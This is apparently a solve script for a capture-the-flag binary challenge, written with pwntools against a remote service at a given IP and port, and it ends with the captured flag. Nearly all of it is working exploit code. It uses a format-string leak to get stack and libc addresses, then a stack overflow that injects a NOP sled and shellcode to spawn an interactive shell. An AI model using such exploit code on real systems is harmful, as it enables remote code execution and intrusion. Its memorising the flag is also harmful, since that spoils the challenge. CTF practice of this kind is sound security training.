from pwn import *

elf = context.binary = ELF("./chall")
libc = elf.libc
# p = process()
p = remote("34.45.81.67" ,16004)

p.send(b"A" * 64)

p.recvuntil("so " + "A" * 64)
leak = u8(p.recv(1))
print("leak",leak)
p.sendline(str(leak))
p.sendline("%1$p|%19$p".ljust(16,"|"))
p.recvuntil("wow ")
stack_leak, libc_leak = p.recvuntil(b"||").strip()[:-2].split(b"|")
stack_leak = int(stack_leak,16)
libc_leak = int(libc_leak,16)
print(hex(stack_leak),hex(libc_leak))
# gdb.attach(p)
p.sendline((b"\x90" * 50 + asm(shellcraft.sh())).ljust(376,b"0")  + p64(stack_leak - 0x126))


p.interactive()

# L3AK{H0nk_m3_t0_th3_3nd_0f_l0v3}